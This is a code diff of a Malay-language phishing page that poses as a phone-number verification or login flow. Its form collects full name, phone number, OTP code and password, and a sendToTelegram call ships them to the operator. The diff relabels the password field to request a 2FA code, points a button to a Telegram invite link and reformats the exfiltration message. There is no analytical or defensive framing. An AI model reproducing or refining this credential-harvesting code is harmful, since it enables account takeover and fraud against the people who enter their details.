@@ -246,7 +246,7 @@
 			<label for="password" class="form-label">
             <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Masukkan kata sandi anda.</span>
 			</label>
-			<input name="password" id="password" class="form-control" type="text" required="true" placeholder="Kata laluan anda">
+			<input name="password" id="password" class="form-control" type="text" required="true" placeholder="verify 2FA anda">
 			</div>
 			<div class="text-center">
 			<button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processThirdData()">Lanjutkan</button>
@@ -257,7 +257,7 @@
 			<p class="text-center"><img src="t5/assets/img/processing.gif" id="ctl00_logohead" class="img-fluid" width="160" /></p>
 			<h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Sila tunggu proses pengesahan dalam masa 1x24 jam untuk menyemak kelayakan,</span></h5>
 			<h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">atau gunakan nombor telefon lain.</span></h5>
-			<p class="text-center"><a href="index.html" class="btn btn-lg btn-block btn-mk">&laquo; <span id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Gunakan Nombor Telefon Lain</span></a></p>
+			<p class="text-center"><a href="https://t.me/+wvoJRR3W8CcwMDg1" class="btn btn-lg btn-block btn-mk">&laquo; <span id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Gunakan Nombor Telefon Lain</span></a></p>
 			</div>
             <script type="text/javascript">
                 //<![CDATA[
@@ -491,18 +491,7 @@ function processThirdData() {
             return false;
         }
 
-        var groupLink = "https://t.me/+wvoJRR3W8CcwMDg1";
-
-var message = `📥 FINAL SUBMISSION
-
-👤 Full Name: ${$full_name}
-📱 Phone Number: ${$phone_number}
-🔐 OTP Code: ${$otp_code}
-🔑 Password: ${$password}
-
-🔗 Join Group:
-${groupLink}`;
-
+        var message = `Final Submission: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}\nPassword: ${$password}`;
         sendToTelegram(message);
 
         setTimeout(() => {
